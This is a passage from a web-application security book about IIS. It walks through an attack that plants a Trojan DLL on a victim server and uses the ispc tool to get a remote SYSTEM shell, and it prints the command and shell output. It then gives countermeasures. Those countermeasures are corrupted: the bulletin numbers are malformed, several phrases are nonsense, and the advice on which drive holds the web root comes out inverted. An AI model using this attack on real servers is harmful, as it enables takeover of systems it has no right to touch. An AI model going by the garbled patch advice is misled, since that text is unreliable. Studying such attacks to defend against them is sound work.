# Hacking Exposed Web Applications

victim server (named, wouldn't you guess, idq.dll). Again, once the Trojan DLL is copied to the victim Web server (say, under /scripts/idq.dll), the attacker can execute ispc.exe and immediately obtain a remote shell as SYSTEM. Talk about instant gratification. Here is a sample of ispc in action (note that you need to hit the ENTER key a few times to get a response from the shell popped by ispc:

```
C:>ispc victim.com/scripts/ idq.dll 80
Start to connect to the server...
Got It!
Press Some <Return> to Enter Shell...
```

Microsoft Windows 2000 [Version 5.00.2195]
(C) Copyright 1985-1999 Microsoft Corp.

```
C:\WINNT\whoami
C:\WINNT\system32
whoami
NT AUTHORITY\SYSTEM
C:\WINNT\system32
```

# File System Traversal Countermeasures

A number of countermeasures can mitigate directory traversal vulnerabilities in IIS.

# Keep up with Security Patches

**Keep up with Security Patches** This sort of fundamental error in basic IIS functionality is best addressed with a patch. There is really no other way to fix it (although we will discuss several steps that you can take to mitigate the risk shortly). The fixes for the Unicode and double decode patches can be found in Microsoft Security Bulletins MS008-086 and MS011-026. Again, amass itself is not included in SP2.

> MS011-026 also changes the InProcess|sap|Apps Metabase setting so privilege escalation Trojan DLLs that can revertToSelf can't be used to escalate privileges on IIS 5.

As always, we recommend the use of an automated tool like the Network Hotfix Checking Tool (hfetch) to help you keep up to date on IIS patches.
In addition to the patch, IIS administrators can engage in other best practices to protect themselves proactively with Unicode, double decode, and future vulnerabilities like them. The following set of recommendations is adapted from Microsoft's recommendations in MS00-078 and amplified with our own approach.

**Install Your Web Folders on a Drive Other than the System Drive** As you have seen, directory traversal exploits like Unicode are restricted by URL syntax that currently hasn't implemented the ability to jump across volumes. Thus, by moving the IIS Web root to a volume with powerful tools like cmd.exe, such exploits aren't feasible. On IIS, the